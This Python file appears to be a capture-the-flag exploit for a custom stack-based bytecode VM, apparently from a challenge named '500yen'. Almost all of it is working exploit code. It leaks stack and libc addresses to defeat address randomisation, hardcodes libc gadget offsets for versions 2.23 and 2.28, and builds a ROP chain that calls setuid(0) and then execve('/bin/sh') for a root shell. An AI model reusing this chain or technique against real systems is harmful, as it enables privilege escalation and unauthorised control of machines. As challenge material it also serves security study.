import struct

# Instructions


def die():
    return b'\x00'


def pop_to_nth_global(n):
    return struct.pack("BB", 1, n)


def push_nth_global(n):
    return struct.pack("BB", 2, n)


def repush():
    # Duplicates the top of the stack
    return b'\x03'


def dereference_stack_and_push():
    return b'\x04'


def push_uint64(i):
    return struct.pack("<BQ", 5, i)


def swap_top_2():
    return b'\x06'


def pop_add_to_top():
    return b'\x07'


def subtract_top_from_pop():
    return b'\x08'


def pop_bitwise_and_top():
    return b'\x09'


def pop_bitwise_or_top():
    return b'\x0a'


def pop_shift_left_by_top():
    # push 10, push 1 -> [1, 10], pop_shift_left_by_top -> [1024]
    return b'\x0b'


def pop_shift_right_by_top():
    return b'\x0c'


def pop_long_shift_right_by_top():
    return b'\x0d'


def pop_print():
    return b'\x0e'


def pop_ff(i):  # Not sure how to explain what this one does
    return struct.pack("<BQ", 15, i)


def write(*ops):
    code = b"".join(ops)
    with open("code.bin", "wb") as f:
        f.write(code)


def pop_print_forever(n=2000):
    solution = [
        pop_print(),
    ] * n
    write(*solution)


def get_500yen(libc_version="2.28"):
    RET_ADDR_ADDR = 123  # arbitrary
    LIBC = 111  # arbitrary
    rop_chain_length = (
        7 +  # calls
        6 +  # register values
        3  # cmd, *cmd, 0
    )  # = 16
    cmd = struct.unpack("<Q", b"/bin/sh\x00")[0]
    execve = 0x3b
    setuid = 105
    uid = 0  # root
    rdi_offset = 8 * (rop_chain_length - 3)  # point to cmd
    rsi_offset = 8 * (rop_chain_length - 2)  # point to char * argv[] (point to rdi followed by 0)
    rdx = 0
    if libc_version == "2.23":
        rdi_call = 0x21102
        rax_call = 0x33544
        rdx_rsi_call = 0x1150c9
        syscall = 0xbc375
    elif libc_version == "2.28":
        rdi_call = 0x23a5f
        rax_call = 0x3a638
        rdx_rsi_call = 0x106749
        syscall = 0xb5b35

    def push_offset_from_global(offset, n):
        return push_uint64(offset) + push_nth_global(n) + pop_add_to_top()

    solution = pop_print() * 19  # pop saved return address

    # Calculate offsets for current address space layout
    # top of stack is $rbp+8*2
    solution += pop_to_nth_global(RET_ADDR_ADDR)  # save $rbp+0x108 in global
    solution += push_uint64(0x100)
    solution += push_nth_global(RET_ADDR_ADDR)  # stack is now [$rbp+0x108, 0x100]
    solution += subtract_top_from_pop()
    solution += pop_to_nth_global(RET_ADDR_ADDR)  # save $rbp+8 (i.e. return_address_address) to global
    solution += pop_print() * 2
    solution += pop_to_nth_global(LIBC)  # save *__libc_start_main+240 in global
    solution += push_uint64(0x20830)
    solution += push_nth_global(LIBC)  # stack is now [*__libc_start_main+240, offset from start of libc]
    solution += subtract_top_from_pop()
    solution += pop_to_nth_global(LIBC)  # save address of start of libc to global
    # $rbp+8*6

    solution += pop_print() * (rop_chain_length - 5)
    # $rbp+8*17

    solution += push_uint64(0)
    solution += push_offset_from_global(rdi_offset, RET_ADDR_ADDR)
    solution += push_uint64(cmd)

    # execve
    solution += push_offset_from_global(syscall, LIBC)
    solution += push_offset_from_global(rsi_offset, RET_ADDR_ADDR)
    solution += push_uint64(rdx)
    solution += push_offset_from_global(rdx_rsi_call, LIBC)
    solution += push_offset_from_global(rdi_offset, RET_ADDR_ADDR)
    solution += push_offset_from_global(rdi_call, LIBC)
    solution += push_uint64(execve)
    solution += push_offset_from_global(rax_call, LIBC)

    # setuid
    solution += push_offset_from_global(syscall, LIBC)
    solution += push_uint64(uid)
    solution += push_offset_from_global(rdi_call, LIBC)
    solution += push_uint64(setuid)
    solution += push_offset_from_global(rax_call, LIBC)  # Start of ROP chain
    # $rbp+8
    write(solution)
